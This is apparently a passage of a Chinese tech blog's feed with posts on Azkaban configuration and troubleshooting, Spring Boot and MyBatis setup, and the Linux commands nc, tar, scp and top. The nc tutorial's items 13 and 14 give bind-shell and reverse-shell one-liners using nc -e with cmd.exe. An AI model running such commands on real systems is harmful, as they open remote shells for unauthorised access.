<h3 id="log4j-properties"><a href="#log4j-properties" class="headerlink" title="log4j.properties"></a>log4j.properties</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log4j.rootLogger=INFO, Console</span><br><span class="line">log4j.logger.azkaban=INFO, server</span><br><span class="line">log4j.appender.server=org.apache.log4j.RollingFileAppender</span><br><span class="line">log4j.appender.server.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.server.File=logs/azkaban-web.log</span><br><span class="line">log4j.appender.server.layout.ConversionPattern=%d&#123;yyyy/MM/dd HH:mm:ss.SSS Z&#125; %p [%c&#123;1&#125;] [Azkaban] %m%n</span><br><span class="line">log4j.appender.server.MaxFileSize=102400MB</span><br><span class="line">log4j.appender.server.MaxBackupIndex=2</span><br><span class="line">log4j.appender.Console=org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.Console.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.Console.layout.ConversionPattern=%d&#123;yyyy/MM/dd HH:mm:ss.SSS Z&#125; %p [%c&#123;1&#125;] [Azkaban] %m%n</span><br></pre></td></tr></table></figure>

<h2 id="executor的conf配制"><a href="#executor的conf配制" class="headerlink" title="executor的conf配制"></a>executor的conf配制</h2><h3 id="azkaban-properties-1"><a href="#azkaban-properties-1" class="headerlink" title="azkaban.properties"></a>azkaban.properties</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cat azkaban.properties </span><br><span class="line"># Azkaban Personalization Settings</span><br><span class="line">default.timezone.id=Asia/Shanghai</span><br><span class="line"># Loader for projects</span><br><span class="line">executor.global.properties=conf/global.properties</span><br><span class="line">azkaban.project.dir=projects</span><br><span class="line"># Azkaban plugin settings</span><br><span class="line">azkaban.jobtype.plugin.dir=plugins/jobtypes</span><br><span class="line"></span><br><span class="line">database.type=mysql</span><br><span class="line">mysql.port=3306</span><br><span class="line">mysql.host=192.168.1.205</span><br><span class="line">mysql.database=azkaban</span><br><span class="line">mysql.user=root</span><br><span class="line">mysql.password=123456</span><br><span class="line">mysql.numconnections=100</span><br><span class="line"></span><br><span class="line"># Azkaban Executor settings</span><br><span class="line">executor.maxThreads=50</span><br><span class="line">executor.port=12321</span><br><span class="line">executor.flow.threads=30</span><br></pre></td></tr></table></figure>

<h3 id="log4j-properties-1"><a href="#log4j-properties-1" class="headerlink" title="log4j.properties"></a>log4j.properties</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log4j.rootLogger=INFO, Console</span><br><span class="line">log4j.logger.azkaban=INFO, server</span><br><span class="line">log4j.appender.server=org.apache.log4j.RollingFileAppender</span><br><span class="line">log4j.appender.server.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.server.File=logs/azkaban-exe.log</span><br><span class="line">log4j.appender.server.layout.ConversionPattern=%d&#123;yyyy/MM/dd HH:mm:ss.SSS Z&#125; %p [%c&#123;1&#125;] [Azkaban] %m%n</span><br><span class="line">log4j.appender.server.MaxFileSize=102400MB</span><br><span class="line">log4j.appender.server.MaxBackupIndex=2</span><br><span class="line">log4j.appender.Console=org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.Console.layout=org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.Console.layout.ConversionPattern=%d&#123;yyyy/MM/dd HH:mm:ss.SSS Z&#125; %p [%c&#123;1&#125;] [Azkaban] %m%n</span><br></pre></td></tr></table></figure>

<h3 id="jobtypes错误解决"><a href="#jobtypes错误解决" class="headerlink" title="jobtypes错误解决"></a>jobtypes错误解决</h3><p>在executor的根目录下创建plugins\jobtypes\commonprivate.properties</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># set execute-as-user</span><br><span class="line">execute.as.user=false</span><br><span class="line">azkaban.native.lib=false</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>任务调度</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>任务调度</tag>
        <tag>azkaban</tag>
      </tags>
  </entry>
  <entry>
    <title>azkaban集群任务执行状态status一直为:Preparing</title>
    <url>/blog/arch/job/azkaban/preparing/</url>
    <content><![CDATA[<p>这问题是集群部署后发生的问题</p>
<p>可能原因：</p>
<ol>
<li>在准备执行flow时，没有指定 useExecutor。</li>
<li>并且多个执行服务器上的内存小于6G或者CPU使用率超过了95%</li>
<li>当指定了useExecutor时，并且设置了内存不检查则可以执行的，小心不要写错了单词哦，也不可以吧这个int类型的留空或者字符串java.lang.NumberFormatException。</li>
<li>查看这个问题的原因，处理解决完上面的三个步骤</li>
</ol>
<p>还要把MySQL中active_executing_flows表的update_time&#x3D;’0’ 数据删除。</p>
<p>并且execution_flows表中executor_id&#x3D;null的也需要删除。</p>
<p>在 flow params中设置”useExecutor” &#x3D; EXECUTOR_ID即可。</p>
<p>EXECUTOR_ID为executors表的主键。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>任务调度</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>任务调度</tag>
        <tag>azkaban</tag>
      </tags>
  </entry>
  <entry>
    <title>Springboot配制文件外置方法</title>
    <url>/blog/javaweb/spring/springboot/outconfig/</url>
    <content><![CDATA[<p>Spring Boot程序默认从application.properties或者application.yaml读取配置，如何将配置信息外置，方便配置呢？</p>
<h2 id="通过命令行指定"><a href="#通过命令行指定" class="headerlink" title="通过命令行指定"></a>通过命令行指定</h2><p>SpringApplication会默认将命令行选项参数转换为配置信息</p>
<p>例如，启动时命令参数指定：</p>
<p><code>java -jar myproject.jar --server.port = 9000</code></p>
<p>从命令行指定配置项的优先级最高，不过你可以通过setAddCommandLineProperties来禁用</p>
<p><code>SpringApplication.setAddCommandLineProperties(false).</code></p>
<h2 id="外置配置文件"><a href="#外置配置文件" class="headerlink" title="外置配置文件"></a>外置配置文件</h2><p>Spring程序会按优先级从下面这些路径来加载application.properties配置文件</p>
<ol>
<li>当前目录下的&#x2F;config目录</li>
<li>当前目录</li>
<li>classpath里的&#x2F;config目录</li>
<li>classpath 跟目录</li>
</ol>
<p>因此，要外置配置文件就很简单了，在jar所在目录新建config文件夹，然后放入配置文件，或者直接放在配置文件在jar目录</p>
<h2 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h2><p>如果你不想使用application.properties作为配置文件，怎么办？完全没问题</p>
<p><code>java -jar myproject.jar --spring.config.location=override.properties</code></p>
<p>或者</p>
<p><code>java -jar -Dspring.config.location=override.properties myproject.jar</code></p>
<p>当然，还能在代码里指定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SpringBootApplication</span><br><span class="line">@PropertySource(value=&#123;&quot;file:config.properties&quot;&#125;)</span><br><span class="line">public class SpringbootrestdemoApplication &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(SpringbootrestdemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="按Profile不同环境读取不同配置"><a href="#按Profile不同环境读取不同配置" class="headerlink" title="按Profile不同环境读取不同配置"></a>按Profile不同环境读取不同配置</h2><p>不同环境的配置设置一个配置文件，例如：</p>
<p>dev环境下的配置配置在<code>application-dev.properties</code>中；</p>
<p>prod环境下的配置配置在<code>application-prod.properties</code>中。</p>
<p>在<code>application.properties</code>中指定使用哪一个文件</p>
<p><code>spring.profiles.active = dev</code></p>
<p>当然，你也可以在运行的时候手动指定：</p>
<p><code>java -jar myproject.jar --spring.profiles.active = prod</code></p>
]]></content>
      <categories>
        <category>JAVA WEB</category>
        <category>Spring Boot</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>JAVA WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】nc命令使用详解</title>
    <url>/blog/os/linux/cmd/nc/</url>
    <content><![CDATA[<p>功能说明：功能强大的网络工具</p>
<p>语　法：nc<br>[-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</p>
<p>参　数：</p>
<p>-g&lt;网关&gt; 设置路由器跃程通信网关，最丢哦可设置8个。</p>
<p>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</p>
<p>-h  在线帮助。</p>
<p>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</p>
<p>-l  使用监听模式，管控传入的资料。</p>
<p>-n  直接使用IP地址，而不通过域名服务器。</p>
<p>-o&lt;输出文件&gt;<br>指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</p>
<p>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</p>
<p>-r  乱数指定本地与远端主机的通信端口。</p>
<p>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</p>
<p>-u  使用UDP传输协议。</p>
<p>-v 详细输出--用两个-v可得到更详细的内容</p>
<p>-w&lt;超时秒数&gt; 设置等待连线的时间。</p>
<p>  -z  使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</p>
<p>nc使用示例</p>
<p>1. 端口扫描</p>
<p># nc -v -w 2 192.168.2.34 -z 21-24</p>
<p>nc: connect to 192.168.2.34 port 21 (tcp) failed: Connection refused</p>
<p>Connection to 192.168.2.34 22 port [tcp&#x2F;ssh] succeeded!</p>
<p>nc: connect to 192.168.2.34 port 23 (tcp) failed: Connection refused</p>
<p>nc: connect to 192.168.2.34 port 24 (tcp) failed: Connection refused</p>
<p>2. 从192.168.2.33拷贝文件到192.168.2.34</p>
<p>在192.168.2.34上： nc -l 1234 &gt; test.txt</p>
<p>在192.168.2.33上： nc 192.168.2.34 &lt; test.txt</p>
<p>3. 简单聊天工具</p>
<p>在192.168.2.34上： nc -l 1234</p>
<p>在192.168.2.33上： nc 192.168.2.34 1234</p>
<p>这样，双方就可以相互交流了。使用ctrl+C(或D）退出。</p>
<p>4. 用nc命令操作memcached</p>
<p>1）存储数据：printf”set key 0 10 6rnresultrn” |nc 192.168.2.34 11211</p>
<p>2）获取数据：printf”get keyrn” |nc 192.168.2.34 11211</p>
<p>3）删除数据：printf”delete keyrn” |nc 192.168.2.34 11211</p>
<p>4）查看状态：printf”statsrn” |nc 192.168.2.34 11211</p>
<p>5）模拟top命令查看状态：watch”echo stats” |nc 192.168.2.34 11211</p>
<p>6）清空缓存：printf”flush_allrn” |nc 192.168.2.34 11211<br>(小心操作，清空了缓存就没了）</p>
<p>5. nc -p 1234 -w 5 host.example.com 80</p>
<p>建立从本地1234端口到host.example.com的80端口连接，5秒超时</p>
<p>nc -u host.example.com 53</p>
<p>u为UDP连接</p>
<p>6. echo -n &quot;GET &#x2F; HTTP&#x2F;1.0&quot;r&quot;n&quot;r&quot;n&quot; | nc host.example.com 80</p>
<p>连接到主机并执行</p>
<p>7. nc -v -z host.example.com 70-80</p>
<p>扫描端口(70到80)，可指定范围。-v输出详细信息。</p>
<p>8. 远程拷贝文件</p>
<p>从server1拷贝文件到server2上。需要先在server2上，用nc激活监听，</p>
<p>server2上运行：</p>
<p>root@hatest2 tmp]# nc -lp 1234 &gt; install.log</p>
<p>server1上运行：</p>
<p>[root@hatest1 ~]# ll install.log</p>
<p>-rw-r–r–  1 root root 39693 12月 20  2007 install.log</p>
<p>[root@hatest1 ~]# nc -w 1 192.168.228.222 1234 &lt; install.log</p>
<p>9. 克隆硬盘或分区</p>
<p>操作与上面的拷贝是雷同的，只需要由dd获得硬盘或分区的数据，然后传输即可。</p>
<p>克隆硬盘或分区的操作，不应在已经mount的的系统上进行。所以，需要使用安装光盘引导后，进入拯救模式（或使用Knoppix工具光盘）启动系统后，在server2上进行类似的监听动作：</p>
<p># nc -l -p 1234 | dd of&#x3D;&#x2F;dev&#x2F;sda</p>
<p>server1上执行传输，即可完成从server1克隆sda硬盘到server2的任务：</p>
<p># dd if&#x3D;&#x2F;dev&#x2F;sda | nc 192.168.228.222 1234</p>
<p>※完成上述工作的前提，是需要落实光盘的拯救模式支持服务器上的网卡，并正确配置IP。</p>
<p>10. 保存Web页面</p>
<p># while true; do nc -l -p 80 -q 1 &lt; somepage.html; done</p>
<p>11. 模拟HTTP Headers,获取网页源代码和返回头部信息</p>
<p>[root@hatest1 ~]# nc 80</p>
<p>GET &#x2F; HTTP&#x2F;1.1</p>
<p>Host: ispconfig.org</p>
<p>Referrer: mypage.com</p>
<p>User-Agent: my-browser</p>
<p>HTTP&#x2F;1.1 200 OK</p>
<p>Date: Tue, 16 Dec 2008 07:23:24 GMT</p>
<p>Server: Apache&#x2F;2.2.6 (Unix) DAV&#x2F;2 mod_mono&#x2F;1.2.1 mod_python&#x2F;3.2.8<br>Python&#x2F;2.4.3 mod_perl&#x2F;2.0.2 Perl&#x2F;v5.8.8</p>
<p>Set-Cookie: PHPSESSID&#x3D;bbadorbvie1gn037iih6lrdg50; path&#x3D;&#x2F;</p>
<p>Expires: 0</p>
<p>Cache-Control: no-store, no-cache, must-revalidate, post-check&#x3D;0,<br>pre-check&#x3D;0</p>
<p>Pragma: no-cache</p>
<p>Cache-Control: private, post-check&#x3D;0, pre-check&#x3D;0, max-age&#x3D;0</p>
<p>Set-Cookie: oWn_sid&#x3D;xRutAY; expires&#x3D;Tue, 23-Dec-2008 07:23:24 GMT;<br>path&#x3D;&#x2F;</p>
<p>Vary: Accept-Encoding</p>
<p>Transfer-Encoding: chunked</p>
<p>Content-Type: text&#x2F;html</p>
<p>[......]</p>
<p>在nc命令后，输入红色部分的内容，然后按两次回车，即可从对方获得HTTP<br>Headers内容。</p>
<p>12. 传输目录</p>
<p>从server1拷贝nginx-0.6.34目录内容到server2上。需要先在server2上，用nc激活监听，server2上运行：</p>
<p>引用</p>
<p>[root@hatest2 tmp]# nc -l 1234 |tar xzvf -</p>
<p>server1上运行：</p>
<p>引用</p>
<p>[root@hatest1 ~]# ll -d nginx-0.6.34</p>
<p>drwxr-xr-x 8 1000 1000 4096 12-23 17:25 nginx-0.6.34</p>
<p>[root@hatest1 ~]# tar czvf – nginx-0.6.34|nc 192.168.228.222 1234</p>
<p>13.REMOTE主机绑定SHELL</p>
<p>例子：</p>
<p>格式：nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe</p>
<p>讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口</p>
<p>14.REMOTE主机绑定SHELL并反向连接</p>
<p>例子：</p>
<p>格式：nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354</p>
<p>讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口</p>
<p>以上为最基本的几种用法（其实NC的用法还有很多，</p>
<p>当配合管道命令&quot;|&quot;与重定向命令&quot;&lt;&quot;、&quot;&gt;&quot;等等命令功能更强大......）。</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】tar命令的使用</title>
    <url>/blog/os/linux/cmd/tar/</url>
    <content><![CDATA[<h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><p>tar [主选项+辅选项] 文件或者目录</p>
<p>使用该命令时，主选项是必须要有的，它告诉tar要做什么事情，辅选项是辅助使用的，可以选用。</p>
<h2 id="主选项："><a href="#主选项：" class="headerlink" title="主选项："></a>主选项：</h2><ul>
<li>-c<br>：创建新的档案文件。如果用户想备份一个目录或是一些文件，就要选择这个选项。相当于打包</li>
<li>-x ：从档案文件中释放文件。相当于拆包。</li>
<li>-t ：列出档案文件的内容，查看已经备份了哪些文件。</li>
</ul>
<p>特别注意，在参数的下达中， c&#x2F;x&#x2F;t<br>仅能存在一个！不可同时存在！因为不可能同时压缩与解压缩。</p>
<h2 id="辅助选项："><a href="#辅助选项：" class="headerlink" title="辅助选项："></a>辅助选项：</h2><ul>
<li>-z ：是否同时具有 gzip 的属性？亦即是否需要用 gzip 压缩或解压？<br>一般格式为xx.tar.gz或xx. tgz</li>
<li>-j ：是否同时具有 bzip2 的属性？亦即是否需要用 bzip2<br>压缩或解压？一般格式为xx.tar.bz2</li>
<li>-v ：压缩的过程中显示文件！这个常用</li>
<li>-f ：使用档名，请留意，在 f 之后要立即接档名喔！不要再加其他参数！</li>
<li>-p ：使用原文件的原来属性（属性不会依据使用者而变）</li>
<li>--exclude FILE：在压缩的过程中，不要将 FILE 打包！</li>
</ul>
<h2 id="范例："><a href="#范例：" class="headerlink" title="范例："></a>范例：</h2><p>范例一：将整个 &#x2F;etc 目录下的文件全部打包成为 &#x2F;tmp&#x2F;etc.tar</p>
<pre><code>[root@linux ~]# tar -cvf /tmp/etc.tar /etc　　　　&lt;==仅打包，不压缩！

[root@linux ~]# tar -zcvf /tmp/etc.tar.gz /etc　　&lt;==打包后，以 gzip 压缩

[root@linux ~]# tar -jcvf /tmp/etc.tar.bz2 /etc　　&lt;==打包后，以 bzip2 压缩

# 特别注意，在参数 f 之后的文件档名是自己取的，我们习惯上都用 .tar 来作为辨识。

# 如果加 z 参数，则以 .tar.gz 或 .tgz 来代表 gzip 压缩过的 tar file ～

# 如果加 j 参数，则以 .tar.bz2 来作为附档名啊～

# 上述指令在执行的时候，会显示一个警告讯息：

# 『tar: Removing leading `/&quot; from member names』那是关於绝对路径的特殊设定。
</code></pre>
<p>范例二：查阅上述 &#x2F;tmp&#x2F;etc.tar.gz 文件内有哪些文件？</p>
<pre><code>[root@linux ~]# tar -ztvf /tmp/etc.tar.gz

# 由於我们使用 gzip 压缩，所以要查阅该 tar file 内的文件时，

# 就得要加上 z 这个参数了！这很重要的！
</code></pre>
<p>范例三：将 &#x2F;tmp&#x2F;etc.tar.gz 文件解压缩在 &#x2F;usr&#x2F;local&#x2F;src 底下</p>
<pre><code>[root@linux ~]# cd /usr/local/src

[root@linux src]# tar -zxvf /tmp/etc.tar.gz

# 在预设的情况下，我们可以将压缩档在任何地方解开的！以这个范例来说

# 我先将工作目录变换到 /usr/local/src 底下，并且解开 /tmp/etc.tar.gz

# 则解开的目录会在 /usr/local/src/etc ，另外，如果您进入 /usr/local/src/etc

# 则会发现，该目录下的文件属性与 /etc/ 可能会有所不同喔！
</code></pre>
<p>范例四：在 &#x2F;tmp 底下，我只想要将 &#x2F;tmp&#x2F;etc.tar.gz 内的 etc&#x2F;passwd<br>解开而已</p>
<pre><code>[root@linux ~]# cd /tmp

[root@linux tmp]# tar -zxvf /tmp/etc.tar.gz etc/passwd

# 我可以透过 tar -ztvf 来查阅 tarfile 内的文件名称，如果单只要一个文件，

# 就可以透过这个方式来下达！注意到！ etc.tar.gz 内的根目录 / 是被拿掉了！
</code></pre>
<p>范例五：我要备份 &#x2F;home, &#x2F;etc ，但不要 &#x2F;home&#x2F;dmtsai</p>
<pre><code>[root@linux ~]# tar --exclude /home/dmtsai -zcvf myfile.tar.gz /home/* /etc
</code></pre>
<h2 id="tar命令的-C参数"><a href="#tar命令的-C参数" class="headerlink" title="tar命令的-C参数"></a>tar命令的-C参数</h2><p>-C dir参数的作用在于改变工作目录，其有效期为该命令中下一次-C<br>dir参数之前。</p>
<pre><code>$ tar -cvf file2.tar /home/usr2/file2
tar: Removing leading &#39;/&#39; from members names
home/usr2/file2
</code></pre>
<p>该命令可以将&#x2F;home&#x2F;usr2&#x2F;file2文件打包到当前目录下的file2.tar中，需要注意的是：使用绝对路径标识的源文件，在用tar命令压缩后，文件名连同绝对路径（这里是home&#x2F;usr2&#x2F;，根目录&#39;&#x2F;&#39;被自动去掉了）一并被压缩进来。使用tar命令解压缩后会出现以下情况：</p>
<pre><code>$ tar -xvf file2.tar
$ ls
…… …… home …… …… 
</code></pre>
<p>解压缩后的文件名不是想象中的file2，而是home&#x2F;usr2&#x2F;file2。</p>
<pre><code>$ tar -cvf file2.tar -C /home/usr2 file2
</code></pre>
<p>该命令中的-C<br>dir参数，将tar的工作目录从当前目录改为&#x2F;home&#x2F;usr2，将file2文件（不带绝对路径）压缩到file2.tar中。</p>
<p>使用tar的-C<br>dir参数，同样可以做到在当前目录&#x2F;home&#x2F;usr1下将文件解压缩到其他目录，例如：</p>
<pre><code>$ tar -xvf file2.tar -C /home/usr2
</code></pre>
<p>而tar不用-C dir参数时是无法做到的：</p>
<pre><code>$ tar -xvf file2.tar /home/usr2
tar: /tmp/file: Not found in archive
tar: Error exit delayed from previous errors
</code></pre>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】scp 远程传输命令</title>
    <url>/blog/os/linux/cmd/scp/</url>
    <content><![CDATA[<p>scp是linux下的远程拷贝</p>
<p>命令：</p>
<ul>
<li>（1）将本地文件拷贝到远程：scp 文件名<br>用户名@计算机IP或者计算机名称:远程路径</li>
<li>（2）从远程将文件拷回本地：scp 用户名@计算机IP或者计算机名称:文件名<br>本地路径</li>
<li>（3）将本地目录拷贝到远程：scp -r 目录名<br>用户名@计算机IP或者计算机名称:远程路径</li>
<li>（4）从远程将目录拷回本地：scp -r<br>用户名@计算机IP或者计算机名称:目录名 本地路径</li>
</ul>
<p>使用scp命令需要服务端linux提供ssh服务（linux默认是没有安装ssh服务的）</p>
<p>1.是否安装ssh：可连接相应的ssh服务查看，sshhost；如出现：ssh: connect to<br>host *** port22:Connection refused，说明尚未安装ssh服务。</p>
<p>2.安装ssh服务：sudo apt-get install openssh-server自动安装ssh服务。</p>
<p>3.启动：sudo &#x2F;etc&#x2F;init.d&#x2F;ssh start</p>
<p>4.停止：sudo &#x2F;etc&#x2F;init.d&#x2F;ssh stop</p>
<p>5.配置：ssh默认的端口是22，可以修改配置文件更改端口，然后重启ssh服务即可。（注：配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config）</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Springmvc整合Mybatis无法读取properties</title>
    <url>/blog/javaweb/spring/springmvc/faqmybatis/</url>
    <content><![CDATA[<p>Springmvc和Mybatis整合，启动如下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Caused by: org.springframework.beans.PropertyBatchUpdateException; nested PropertyAccessExceptions (1) are:</span><br><span class="line">PropertyAccessException 1: org.springframework.beans.MethodInvocationException: Property &#x27;driverClassName&#x27; threw exception; nested exception is java.lang.IllegalStateException: Could not load JDBC driver class [$&#123;jdbc.driver&#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>显然是没有加载配制文件，把占位符当成值处理了。</p>
<p>查了下，因为MapperScannerConigurer实际是在解析加载bean定义阶段的，这个时候要是设置sqlSessionFactory的话，会导致提前初始化一些类，这个时候，PropertyPlaceholderConfigurer还没来得及替换定义中的变量，导致把表达式当作字符串复制了。</p>
<p>修改方法一：</p>
<p>修改</p>
<p><code>&lt;property name=&quot;sqlSessionFactory&quot; ref=&quot;sqlSessionFactory&quot;/&gt;</code></p>
<p>为</p>
<p><code>&lt;property name=&quot;sqlSessionFactoryBeanName&quot; value=&quot;sqlSessionFactory&quot;/&gt;</code></p>
<p>原理：使用sqlSessionFactoryBeanName注入，不会立即初始化sqlSessionFactory, 所以不会引发提前初始化问题。</p>
<p>修改方法二：</p>
<p>直接删掉<code>&lt;property name=&quot;sqlSessionFactory&quot; ref=&quot;sqlSessionFactory&quot;/&gt;</code></p>
<p>注意：在没有配置这一行时，必须配置一个以sqlSessionFactory命名的org.mybatis.spring.SqlSessionFactoryBean。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">	xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">	xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">	xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">	xsi:schemaLocation=&quot;  </span><br><span class="line">  http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd  </span><br><span class="line">  http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd  </span><br><span class="line">  http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd</span><br><span class="line">  http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd </span><br><span class="line">  http://www.springframework.org/schema/mvc  http://www.springframework.org/schema/mvc/spring-mvc-4.0.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;propertyConfigurer&quot;</span><br><span class="line">		class=&quot;org.springframework.beans.factory.config.PropertyPlaceholderConfigurer&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;location&quot; value=&quot;classpath:config.properties&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;dataSource&quot;</span><br><span class="line">		class=&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;driverClassName&quot; value=&quot;$&#123;jdbc.driver&#125;&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot; /&gt;</span><br><span class="line">		&lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;basePackage&quot; value=&quot;cn.gov.pbc.dao&quot;&gt;&lt;/property&gt;</span><br><span class="line">&lt;!-- 		&lt;property name=&quot;sqlSessionFactory&quot; ref=&quot;sqlSessionFactory&quot;&gt;&lt;/property&gt; --&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;txManager&quot;</span><br><span class="line">		class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;</span><br><span class="line">		&lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;&gt;&lt;/property&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;tx:annotation-driven transaction-manager=&quot;txManager&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JAVA WEB</category>
      </categories>
      <tags>
        <tag>JAVA WEB</tag>
        <tag>spring</tag>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】top命令</title>
    <url>/blog/os/linux/cmd/top/</url>
    <content><![CDATA[<p>top使用方法：</p>
<p>使用格式：</p>
<p>top [-] [d] [p] [q] [c] [C] [S] [s] [n]</p>
<p>参数说明：</p>
<p>d：指定每两次屏幕信息刷新之间的时间间隔。当然用户可以使用s交互命令来改变之。<br>p:通过指定监控进程ID来仅仅监控某个进程的状态。<br>q:该选项将使top没有任何延迟的进行刷新。如果调用程序有超级用户权限，那么top将以尽可能高的优先级运行。<br>S：指定累计模式。<br>s：使top命令在安全模式中运行。这将去除交互命令所带来的潜在危险。<br>i：使top不显示任何闲置或者僵死进程。<br>c:显示整个命令行而不只是显示命令名。</p>
<p>VIRT：virtual memory usage 虚拟内存<br>1、进程“需要的”虚拟内存大小，包括进程使用的库、代码、数据等<br>2、假如进程申请100m的内存，但实际只使用了10m，那么它会增长100m，而不是实际的使用量</p>
<p>RES：resident memory usage 常驻内存<br>1、进程当前使用的内存大小，但不包括swap out<br>2、包含其他进程的共享<br>3、如果申请100m的内存，实际使用10m，它只增长10m，与VIRT相反<br>4、关于库占用内存的情况，它只统计加载的库文件所占内存大小</p>
<p>SHR：shared memory 共享内存<br>1、除了自身进程的共享内存，也包括其他进程的共享内存<br>2、虽然进程只使用了几个共享库的函数，但它包含了整个共享库的大小<br>3、计算某个进程所占的物理内存大小公式：RES – SHR<br>4、swap out后，它将会降下来</p>
<p>DATA<br>1、数据占用的内存。如果top没有显示，按f键可以显示出来。<br>2、真正的该程序要求的数据空间，是真正在运行中要使用的。</p>
